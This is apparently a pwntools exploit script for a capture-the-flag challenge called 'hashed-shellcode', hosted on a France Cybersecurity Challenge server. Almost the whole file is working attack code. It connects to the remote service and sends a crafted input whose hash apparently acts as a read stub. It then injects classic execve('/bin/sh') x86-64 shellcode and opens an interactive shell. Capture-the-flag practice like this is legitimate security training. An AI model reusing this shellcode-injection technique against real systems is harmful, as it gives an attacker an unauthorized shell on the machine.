from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep

context.arch = "amd64"
context.word_size = 64

file = "./hashed-shellcode"
args = []
io: process = None

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """

    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote(host="challenges.france-cybersecurity-challenge.fr", port=2107)

def launch_local():
    global file, io
    pty = process.PTY
    io = process([file, *args], stdin=pty, stdout=pty) # stdin=pty to avoid pwntools messing with the file structures and the heap
    debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)

def launch():
    l = launch_local
    l = launch_remote
    l()

def getb(d, a, b):
    a_ = d.find(a)
    return d[a_+len(a):d.find(b, a_)]

#
# exploit goes here
#

# exe = ELF(file)
# libc = ELF("./libc.so.6")

def exploit():
    read_shellcode = b"FCSC_9Sfzbv=oED?^0JVy0a>zxDz=xP=" # will start with push rdx; pop rsi; syscall after the hash
    io.send(read_shellcode)
    sleep(speed)

    shellcode = asm(
    """
    mov rax, 0x0068732f6e69622f
    push rax
    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    mov eax, 0x3b
    syscall
    """) # classic execve("/bin/sh") shellcode

    sl(b"A"*4 + shellcode) # four "A" to overwrite the old shellcode

    io.interactive()
    input("end")
    exit()

launch()
exploit()
